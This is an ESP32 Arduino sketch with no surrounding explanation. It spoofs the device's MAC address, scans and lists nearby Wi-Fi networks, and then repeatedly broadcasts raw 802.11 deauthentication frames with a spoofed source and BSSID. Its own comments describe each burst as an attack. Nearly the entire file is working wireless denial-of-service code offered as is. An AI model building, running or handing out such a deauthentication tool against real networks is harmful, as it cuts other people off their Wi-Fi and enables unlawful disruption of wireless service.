#include <WiFi.h>
#include "esp_wifi.h"

int scanCount = 0;
uint8_t fakeMAC[6] = {0xDE, 0xAD, 0xBE, 0xEF, 0xFE, 0xED};

uint8_t deauthPacket[26] = {
  0xc0, 0x00,                         // Deauth frame control
  0x3a, 0x01,                         // Duration
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination: broadcast
  0xde, 0xad, 0xbe, 0xef, 0xfe, 0xed, // Source MAC (spoofed)
  0xde, 0xad, 0xbe, 0xef, 0xfe, 0xed, // BSSID (spoofed)
  0x00, 0x00,                         // Sequence
  0x07, 0x00                          // Reason code: 7
};

void setup() {
  Serial.begin(115200);

  // Set WiFi to scan mode
  WiFi.mode(WIFI_MODE_STA);
  esp_wifi_set_mac(WIFI_IF_STA, &fakeMAC[0]); // MAC spoofing
  Serial.print("Fake MAC set to: ");
  Serial.printf("%02x:%02x:%02x:%02x:%02x:%02x\n", 
                fakeMAC[0], fakeMAC[1], fakeMAC[2],
                fakeMAC[3], fakeMAC[4], fakeMAC[5]);

  delay(1000);
  scanNetworks();
}

void loop() {
  Serial.println("\nSending Deauth packets...");
  for (int i = 0; i < 20; i++) {
    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
    delay(100);
  }
  delay(10000); // 10 seconds between attacks
}

void scanNetworks() {
  Serial.println("Scanning for Wi-Fi networks...");

  int n = WiFi.scanNetworks();
  if (n == 0) {
    Serial.println("No networks found.");
  } else {
    Serial.printf("%d networks found:\n", n);
    for (int i = 0; i < n; ++i) {
      Serial.printf("%2d: %s (%s), RSSI: %d dBm, Channel: %d\n", i + 1,
                    WiFi.SSID(i).c_str(),
                    WiFi.BSSIDstr(i).c_str(),
                    WiFi.RSSI(i),
                    WiFi.channel(i));
      delay(10);
    }
  }
}
